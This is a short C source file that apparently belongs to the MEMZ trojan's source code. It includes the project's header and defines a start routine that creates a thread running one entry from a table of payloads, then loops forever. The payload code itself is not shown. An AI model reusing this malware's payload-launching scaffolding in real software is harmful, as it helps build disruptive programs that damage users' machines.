#include "../MEMZ.h"

void start() {
	CreateThread(NULL, NULL, payloads[PL2].payloadHost, &payloads[PL2], NULL, NULL);

	for (;;) {
		Sleep(1);
	}
} 
